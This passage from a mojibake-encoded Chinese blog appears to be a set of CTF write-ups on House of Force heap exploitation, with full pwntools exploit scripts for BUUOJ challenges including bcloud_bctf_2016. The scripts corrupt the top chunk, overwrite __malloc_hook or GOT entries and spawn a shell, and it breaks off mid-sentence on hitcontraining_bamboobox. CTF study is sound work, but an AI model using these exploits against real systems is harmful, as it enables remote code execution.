title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>å› ä¸ºè¿™é“é¢˜æ²¡æœ‰freeå‡½æ•°ï¼Œå°±ä¸€ä¸ªaddå‡½æ•°ï¼Œå› æ­¤å¾ˆå¤šæ‰‹æ³•éƒ½æ˜¯å¤±æ•ˆäº†ã€‚ä½†æ˜¯å› ä¸ºè¿™å‡ ä¸ªæ¼æ´ç‚¹æ­£å¥½ç¬¦åˆhouse of forceæ”»å‡»çš„æ¡ä»¶ã€‚æ‰€ä»¥å°±ç”¨house of forceå˜å˜æ‰“äº†ã€‚</p><p>1ã€å…ˆç”³è¯·ä¸€å—è¶…å¤§å†…å­˜ï¼Œåˆ©ç”¨mmapæ˜ å°„åä¸libcåŸºåœ°å€å­˜åœ¨çš„å›ºå®šåç§»ï¼Œæ¥æ‹¿åˆ°libcåŸºåœ°å€ã€‚</p><p>2ã€å°†top chunkçš„sizeä½ä¿®æ”¹ä¸º-1</p><p>3ã€ç²¾å¿ƒæ„é€ å‡ºç”³è¯·chunkçš„å¤§å°ï¼Œä¿è¯ä»top chunkä¸­åˆ‡ä¸‹æ¥åï¼Œè®©top chunkä½äºmalloc_hook(å…¶å®åº”è¯¥ä½äºrealloc_hookä¸Šçš„ï¼Œå› ä¸ºè¦ç”¨reallocæ¥è°ƒæ•´æ ˆå¸§ï¼Œä¸è¿‡è¿™å°±æ˜¯åè¯äº†)</p><p>4ã€ç”³è¯·å †å—ï¼Œå°†malloc_hookä»top chunkä¸­ç”³è¯·å‡ºæ¥ï¼Œç„¶åå†™å…¥one_gadgetã€‚</p><p>5ã€å‘ç°æ‰€æœ‰one_gadgetéƒ½æ‰“ä¸é€šï¼Œåªèƒ½ç”¨reallocè°ƒæ•´æ ˆå¸§å†æ‰“one_gadget</p><blockquote><p>ç„¶åæˆ‘ä¸»è¦æä¸‰ä¸ªç‚¹åšä¸€ä¸‹ç›¸å…³è§£é‡Šå§:</p><p>1ã€ä¸ºä»€ä¹ˆå…¶ä»–å¸ˆå‚…éƒ½ç”³è¯·çš„æ˜¯0x200000å¤§å°çš„å †å—ï¼Ÿ</p><p>2ã€ç²¾å¿ƒæ„é€ chunkå¤§å°ï¼Œè®©top chunkä½äºmalloc_hookä¸Šï¼Œè¿™ä¸ªchunkå¤§å°æ˜¯æ€ä¹ˆç®—çš„ï¼Ÿ</p><p>3ã€æœ€årealloc+4æ˜¯æ€ä¹ˆè°ƒè¯•å‡ºæ¥çš„?</p></blockquote><h3 id="1ã€ä¸ºä»€ä¹ˆå…¶ä»–å¸ˆå‚…éƒ½ç”³è¯·çš„æ˜¯0x200000å¤§å°çš„å †å—ï¼Ÿ"><a href="#1ã€ä¸ºä»€ä¹ˆå…¶ä»–å¸ˆå‚…éƒ½ç”³è¯·çš„æ˜¯0x200000å¤§å°çš„å †å—ï¼Ÿ" class="headerlink" title="1ã€ä¸ºä»€ä¹ˆå…¶ä»–å¸ˆå‚…éƒ½ç”³è¯·çš„æ˜¯0x200000å¤§å°çš„å †å—ï¼Ÿ"></a>1ã€ä¸ºä»€ä¹ˆå…¶ä»–å¸ˆå‚…éƒ½ç”³è¯·çš„æ˜¯0x200000å¤§å°çš„å †å—ï¼Ÿ</h3><p>å¦‚æœå¤§å®¶è¿™é‡Œå°è¯•è¿‡mmapæ˜ å°„å†…å­˜å¤§å°æ˜¯å‡ ä¸‡å­—èŠ‚æˆ–è€…åå‡ ä¸‡å­—èŠ‚çš„è¯ï¼Œåº”è¯¥ä¼šå‘ç°ï¼Œæœ¬åœ°èƒ½æ‰“é€šï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šè¿™ä¸ªæƒ…å†µã€‚</p><p><strong>å¯¼è‡´äº†è¿™ä¸ªæƒ…å†µçš„åŸå› æ˜¯å› ä¸ºç”³è¯·çš„å †å—åœ°å€ä½äºäº†ldä¸­</strong>(è¯·å‚è€ƒä¸‹å›¾ )å¦‚æœç¯å¢ƒä¸€æ ·çš„æƒ…å†µä¸‹ï¼Œlibcå’Œldç›´æ¥çš„å›ºå®šåç§»æ˜¯å¯ä»¥ç›´æ¥ç”¨çš„ï¼Œå°±æ˜¯è¯´ä½ æœ¬åœ°çš„ç¯å¢ƒå¦‚æœå’Œè¿œç¨‹çš„ç¯å¢ƒä¸€æ ·çš„è¯(è¿™ä¸ªç¯å¢ƒç›¸åŒæŒ‡çš„å¹¶ä¸æ˜¯libcç›¸åŒ)ï¼Œä½ æ‹¿ldä¸libcçš„å›ºå®šåç§»ï¼Œæ‰“è¿œç¨‹ä¹Ÿæ˜¯okçš„ã€‚ä½†æ˜¯å¦‚æœæœ¬åœ°å’Œè¿œç¨‹ç¯å¢ƒä¸ä¸€æ ·ï¼Œç»“æœå°±æ˜¯ä½ æœ¬åœ°ç”¨ldå’Œlibcçš„é‚£ä¸ªåç§»èƒ½æ‰“é€šï¼Œä½†æ˜¯åˆ°è¿œç¨‹è¿˜ç”¨è¿™ä¸ªåç§»æ‹¿åˆ°çš„å°±ä¸æ˜¯libcæ­£ç¡®çš„åŸºåœ°å€äº†ã€‚</p><p><img src="/../img/image-20221007212827121.png"></p><p>ç»è¿‡æˆ‘ä¸æ–­è°ƒè¯•ï¼Œå‘ç°å½“ç”³è¯·0x1FBFE9å¤§å°ä»¥ä¸Šçš„æ—¶å€™ï¼Œmmapæ˜ å°„çš„å†…å­˜æ‰ä¼šåˆ°libcåŒºåŸŸã€‚(æœ€å¤§æ˜¯å¤šå°‘ï¼Œæˆ‘æ²¡æœ‰è¯•)</p><p>æ‰€ä»¥è¯´è¿™é‡Œæœªå¿…éè¦æ˜¯ç”³è¯·0x200000å¤§å°çš„å †å—ï¼Œåªè¦å¤§äºç­‰äº0x1fbfe9å°±è¡Œã€‚è¿™æ ·ç”³è¯·å‡ºæ¥çš„å †å—åœ°å€å°±å’ŒlibcåŸºåœ°å€å­˜åœ¨å›ºå®šåç§»äº†(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007212919863.png" alt="image-20221007212919863"></p><h3 id="2ã€ç”³è¯·çš„sizeä¸ºå¤šå°‘ï¼Œæ‰èƒ½è®©top-chunkä½äºmalloc-hookä¸Šï¼Ÿ"><a href="#2ã€ç”³è¯·çš„sizeä¸ºå¤šå°‘ï¼Œæ‰èƒ½è®©top-chunkä½äºmalloc-hookä¸Šï¼Ÿ" class="headerlink" title="2ã€ç”³è¯·çš„sizeä¸ºå¤šå°‘ï¼Œæ‰èƒ½è®©top chunkä½äºmalloc_hookä¸Šï¼Ÿ"></a>2ã€ç”³è¯·çš„sizeä¸ºå¤šå°‘ï¼Œæ‰èƒ½è®©top chunkä½äºmalloc_hookä¸Šï¼Ÿ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¥—è¿™ä¸ªå¼å­ï¼Œè§£é‡Šåœ¨æ–‡ç« æœ€å¼€å§‹ã€‚</p><p>éƒ½ä¸ç”¨ç®—å‡ºæ¥ï¼Œè„šæœ¬ç›´æ¥è¿™æ ·å†™å³å¯ã€‚</p><p><img src="/../img/image-20221007212926940.png"></p><p><strong>è¿™é‡Œå¤šå‡äº†0x10çš„åŸå› æ˜¯å› ä¸ºï¼Œæˆ‘å°†top chunkçš„åœ°å€ç¯¡æ”¹ä¸ºäº†realloc_hook-8çš„ä½ç½®ã€‚å› ä¸ºè¦è¿ç€realloc_hookå’Œmalloc_hookä¸€èµ·ä¿®æ”¹äº†,è°ƒæ•´æ ˆå¸§æ‰“one_gadgetã€‚</strong></p><h3 id="3ã€realloc-4æ˜¯æ€ä¹ˆè°ƒè¯•å‡ºæ¥çš„"><a href="#3ã€realloc-4æ˜¯æ€ä¹ˆè°ƒè¯•å‡ºæ¥çš„" class="headerlink" title="3ã€realloc+4æ˜¯æ€ä¹ˆè°ƒè¯•å‡ºæ¥çš„?"></a>3ã€realloc+4æ˜¯æ€ä¹ˆè°ƒè¯•å‡ºæ¥çš„?</h3><p>è¿™ä¸ªå’‹è°ƒè¯•çš„è¯ï¼Œæœ¬æ–‡å°±ä¸å…·ä½“è¯´æ˜äº†ã€‚ä¸»è¦ä¼šçš„å¸ˆå‚…ä¸éœ€è¦è§£é‡Šï¼Œä¸ä¼šçš„å¸ˆå‚…éœ€è¦ä»”ç»†è§£é‡Šè¯´æ˜ã€‚æ‰€ä»¥éœ€è¦å¼„æ‡‚realloc+4å’‹è°ƒè¯•å‡ºæ¥çš„å¸ˆå‚… å¯ä»¥çœ‹æˆ‘è¿™ç¯‡<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3">æ–‡ç« </a>  ä»”ç»†çœ‹å®Œä¹‹åï¼Œä¿è¯å˜å˜ä¼šã€‚å¦‚æœå¯¹æˆ‘å†™çš„å“ªé‡Œæœ‰ç–‘é—®ï¼Œå¯ä»¥ä¸€èµ·äº¤æµä¸€ä¸‹ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">    heap_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line">leak_libc_addr=add(<span class="number">0x210000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr+<span class="number">0x210ff0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">leak_heap_addr=add(<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0x10</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">realloc_addr=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+libc_base_addr</span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base_addr</span><br><span class="line">log_addr(<span class="string">&#x27;malloc_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add((malloc_hook-<span class="number">0x20</span>-top_chunk_addr-<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xCCB,0xAF9)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007212940793.png" alt="image-20221007212940793"></p><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007212946708.png" alt="image-20221007212946708"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š-1"><a href="#æ¼æ´æ‰€åœ¨ï¼š-1" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><h4 id="å †åœ°å€çš„æ³„éœ²"><a href="#å †åœ°å€çš„æ³„éœ²" class="headerlink" title="å †åœ°å€çš„æ³„éœ²"></a>å †åœ°å€çš„æ³„éœ²</h4><p><img src="/../img/image-20221007212955450.png" alt="image-20221007212955450"></p><p>è¿™é‡Œä¹ä¸€çœ‹malloc(0x40),input 0x40çš„æ•°æ®ä¼¼ä¹ä¸å­˜åœ¨æº¢å‡ºï¼Œä½†å› ä¸ºstrcpyå‡½æ•°çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿™é‡Œçš„æº¢å‡ºæ˜¯å¿…ç„¶çš„ã€‚æˆ‘ä»¬ç›´æ¥å°†0x40ä¸ªæ•°æ®è¾“æ»¡ï¼Œç„¶åè°ƒä¸€ä¸‹(å¦‚ä¸‹å›¾)ã€‚</p><p><img src="/../img/image-20221007213007064.png" alt="image-20221007213007064"></p><p>(ä¸Šå›¾æ˜¯å³å°†æ‹·è´ï¼Œä¹‹å‰strcpyå‡½æ•°å‰çš„æ ˆç©ºé—´)strcpyå‡½æ•°ä¼šå°†çº¢è‰²æ¡†éƒ¨åˆ†çš„æ•°æ®ä»¥åŠä¸€ä¸ª\x00å…¨éƒ¨æ‹·è´åˆ°åˆšç”³è¯·çš„0x40çš„å †å—ä¸­ï¼Œä¼šå‘ç°æ­¤æ—¶æ‹·è´çš„æ•°æ®æº¢å‡ºäº†æœ«å°¾çš„å †åœ°å€ä»¥åŠä¸€ä¸ª\x00ã€‚æº¢å‡ºåŸå› æ˜¯å› ä¸ºstrcpyå‡½æ•°é‡åˆ°\x00æˆ–è€…\x0aæ‰ä¼šåœæ­¢ï¼Œè€Œè¾“å…¥çš„æ•°æ®å°†åŸæœ¬æ ˆä¸­çš„\x00ç»™è¦†ç›–æ‰äº†ï¼Œå°±å¯¼è‡´å¤šæ‹·è´äº†ä¸€ä¸ªåœ°å€ï¼Œç„¶åæ‹·è´ç»“æŸstrcpyå‡½æ•°ä¼šåŠ ä¸Šä¸€ä¸ª\x00ã€‚</p><p>ä¸‹å›¾ä¸ºæ‹·è´åçš„å †å¸ƒå±€ï¼Œå¯ä»¥å‘ç°æ‹·è´åé€ æˆäº†æº¢å‡ºã€‚</p><p><img src="/../img/image-20221007213014472.png" alt="image-20221007213014472"></p><p>æ¥ä¸‹æ¥å†æ‰§è¡Œprintfå‡½æ•°çš„æ—¶å€™å°±å°†è¿™ä¸ªæº¢å‡ºçš„å †åœ°å€æ³„éœ²å‡ºæ¥äº†ã€‚</p><p><img src="/../img/image-20221007213022094.png" alt="image-20221007213022094"></p><h4 id="strcpyå¯¼è‡´å †æº¢å‡º"><a href="#strcpyå¯¼è‡´å †æº¢å‡º" class="headerlink" title="strcpyå¯¼è‡´å †æº¢å‡º"></a>strcpyå¯¼è‡´å †æº¢å‡º</h4><p>æœ‰äº†ä¸Šé¢çš„æº¢å‡ºæƒ…å†µåï¼Œæˆ‘ä»¬å¦‚æ³•ç‚®åˆ¶ï¼Œåœ¨è¿™é‡Œä¾æ—§å°†ä¸¤æ¬¡çš„è¾“å…¥å†™æ»¡ï¼Œçœ‹çœ‹ä¼šä¸ä¼šä¹Ÿå‡ºç°æº¢å‡ºçš„æƒ…å†µ</p><p>è§‚å¯Ÿä¸‹å›¾å‘ç°ï¼Œç¡®å®åˆå‘ç”Ÿäº†æº¢å‡ºï¼Œè€Œæº¢å‡ºçš„åŸå› ä¸ä¸Šé¢å †åœ°å€æ³„éœ²é‚£ä¸ªæº¢å‡ºåŸå› ä¸€æ ·ï¼Œä¹Ÿæ˜¯å› ä¸ºæ ˆé‡Œæ²¡æœ‰å‡ºç°\x00å°†strcpyå‡½æ•°æˆªæ–­ï¼Œå¯¼è‡´strcpyæ‹·è´æ—¶å‘ç”Ÿäº†æº¢å‡ºã€‚</p><p><img src="/../img/image-20221007213200865.png" alt="image-20221007213200865"></p><p>è¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥ç°åœ¨å¯ä»¥æ§åˆ¶top chunkçš„å¤§å°ï¼ŒçŸ¥é“top chunkçš„åœ°å€ï¼Œmallocç”³è¯·å †å—å¤§å°æ—¶ä¸å—é™åˆ¶ï¼Œå› æ­¤é€‰æ‹©house of force attackã€‚</p><h3 id="å¤§è‡´æ€è·¯ï¼š-1"><a href="#å¤§è‡´æ€è·¯ï¼š-1" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>1ã€åˆ©ç”¨strcpyå‡½æ•°çš„æº¢å‡ºé…åˆ%sæ¥æ³„éœ²å †åœ°å€ï¼Œå†åˆ©ç”¨strcpyå‡½æ•°æº¢å‡ºæ¥ä¿®æ”¹top chunkçš„sizeä¸º0xffffffffã€‚</p><p>2ã€åˆ©ç”¨house of forceå°†top chunkä½ç½®æ”¹åˆ°bssæ®µæŒ‡é’ˆæ•°ç»„çš„ä½ç½®</p><p>3ã€ç¯¡æ”¹bssæ®µå­˜å‚¨chunkåœ°å€çš„æŒ‡é’ˆæ•°ç»„ä¸ºfreeçš„gotåœ°å€å’Œputsçš„gotåœ°å€</p><p>4ã€ç”¨editå°†freeçš„gotè¡¨æ”¹ä¸ºputsçš„pltè¡¨</p><p>5ã€freeå­˜å‚¨åœ¨bssæ®µä¸Šçš„putsçš„gotåœ°å€ï¼Œç”±æ­¤æ¥æ³„éœ²libcåœ°å€</p><p>6ã€å°†freeçš„gotåœ°å€æ”¹ä¸ºsystemåœ°å€ï¼Œç„¶åfreeæ‰å­˜æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åœ°å€å³å¯è·å–shell</p><h3 id="ç¯¡æ”¹free-gotè¡¨çš„ä¸€ä¸ªå‘"><a href="#ç¯¡æ”¹free-gotè¡¨çš„ä¸€ä¸ªå‘" class="headerlink" title="ç¯¡æ”¹free gotè¡¨çš„ä¸€ä¸ªå‘"></a>ç¯¡æ”¹free gotè¡¨çš„ä¸€ä¸ªå‘</h3><p>æ•´ä½“åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚ä¸»è¦è®°å½•ä¸€ä¸‹ç¯¡æ”¹freeå‡½æ•°gotè¡¨æ—¶çš„ä¸€ä¸ªå‘ã€‚</p><p>ç”±äºæ­¤æ—¶æˆ‘ä»¬å·²ç»å°†top chunkçš„åœ°å€è¿›è¡Œäº†ä¿®æ”¹ï¼Œè€Œæ­¤æ—¶top chunkçš„sizeä¸º<img src="/../img/image-20221007213214848.png"></p><p>ä¸Šå›¾çš„è¿™ä¸ªsizeä¸æ˜¯å›ºå®šä¸å˜çš„ï¼Œè·Ÿtop chunkçš„åœ°å€æœ‰å…³ç³»ï¼Œä¸è¿‡è¿™ä¸ªsizeè‚¯å®šæ˜¯ä¸€ä¸ªè´Ÿæ•°(è¿™é‡Œå±•ç¤ºçš„æ˜¯è¡¥ç )</p><p>è¿™ä¸ªsizeè®°å½•çš„æ˜¯ idä¸º0çš„chunkå¤§å°ã€‚</p><p>ç„¶ååœ¨editå‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªæ£€æŸ¥(å¦‚ä¸‹)</p><p><img src="/../img/image-20221007213222656.png" alt="image-20221007213222656"></p><p>iåˆå§‹å€¼ä¸º0ï¼Œä½†æ˜¯a2(å°±æ˜¯size)ä¸ºè´Ÿæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæˆ‘ä»¬çš„æ•°æ®æ˜¯å†™ä¸è¿›å»çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å‡½æ•°çš„gotåœ°å€å¸ƒç½®åˆ°idä¸º0ä¹‹åçš„chunkåœ°å€æ‰è¡Œï¼Œå¦åˆ™æ— æ³•å¯¹å…¶è¿›è¡Œç¼–è¾‘ã€‚</p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc32.so&#x27;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26687</span>)</span><br><span class="line">c_a=<span class="number">0x08048D11</span></span><br><span class="line">c_d=<span class="number">0x08048D26</span></span><br><span class="line">c_e=<span class="number">0x08048D1F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the length of the note content:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Create success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the new content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Edit success.\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Delete success.\n&#x27;)</span></span><br><span class="line">    </span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">leak_heap_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap_addr&#x27;</span>)</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:\n&#x27;</span>,p64(<span class="number">0xffffffff</span>))</span><br><span class="line"><span class="comment">#debug(p,c_a,c_d,c_e,0x08048BE1)</span></span><br><span class="line">add((<span class="number">0x0804B120</span>-<span class="number">0x10</span>-top_chunk_addr),<span class="string">&#x27;zikh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(free_got_addr)+p32(puts_got_addr)+p32(<span class="number">0x0804B120</span>+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p><strong>è¿™é‡Œæˆ‘åªè®°å½•ç”¨house of forceçš„æ”»å‡»æ‰‹æ³•ï¼Œå¦‚æœæƒ³æ‰“è¿œç¨‹çš„è¯ï¼Œè¦ç”¨unlinkæ¥æ‰“ã€‚</strong></p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007213240679.png" alt="image-20221007213240679"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š-2"><a href="#æ¼æ´æ‰€åœ¨ï¼š-2" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p><img src="/../img/image-20221007213427195.png" alt="image-20221007213427195"></p><p>å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°</p><p><img src="/../img/image-20221007213259955.png" alt="image-20221007213259955"></p><p>ç„¶åå­˜åœ¨v3é‡Œå­˜äº†ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œç„¶åå¦‚æœé€‰æ‹©5çš„è¯ï¼Œä¼šæ‰§è¡Œå…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p><img src="/../img/image-20221007213311228.png"></p><p>mallocç”³è¯·çš„æ—¶å€™ï¼Œå¯¹size(ä¹Ÿå°±æ˜¯v2)æ²¡æœ‰è¿›è¡Œæ£€æŸ¥</p><p><img src="/../img/image-20221007213319620.png"></p><p>ç„¶åeditå‡½æ•°ä¸­ï¼Œå¯¹sizeæ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨å †æº¢å‡ºã€‚</p><h3 id="å¤§è‡´æ€è·¯ï¼š-2"><a href="#å¤§è‡´æ€è·¯ï¼š-2" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>é€šå¸¸æ¥è¯´ï¼Œèƒ½åˆ©ç”¨è¿™å‡ ç‚¹çš„è¯ï¼Œæ˜¯æ‰“ä¸äº†house of forceçš„ï¼Œå› ä¸ºæ²¡æœ‰top chunkçš„åœ°å€ã€‚ä½†æ˜¯è¿™é“é¢˜æ¯”è¾ƒç‰¹æ®Šçš„æ˜¯æˆ‘ä»¬åªéœ€è¦å°†top chunkæ”¾åˆ°å‡½æ•°æŒ‡é’ˆçš„å †å—å³å¯ã€‚è€Œtop chunkå’Œè¯¥å †å—æ˜¯å­˜åœ¨å›ºå®šçš„åç§»çš„ï¼Œä¹Ÿå°±æ˜¯<code>request_size=target_addr-0x20-victim</code>ä¸­çš„target_addr-victimçš„å€¼æˆ‘ä»¬æ˜¯çŸ¥é“çš„ã€‚å› æ­¤å¹¶ä¸éœ€è¦çŸ¥é“top chunkçš„åœ°å€ä¹Ÿå¯ä»¥å®Œæˆhouse of forceæ”»å‡»ã€‚</p><p>1ã€ç”³è¯·ä¸€ä¸ªå †å—ï¼Œç„¶ååˆ©ç”¨editä¸­çš„æº¢å‡ºï¼Œä¿®æ”¹top 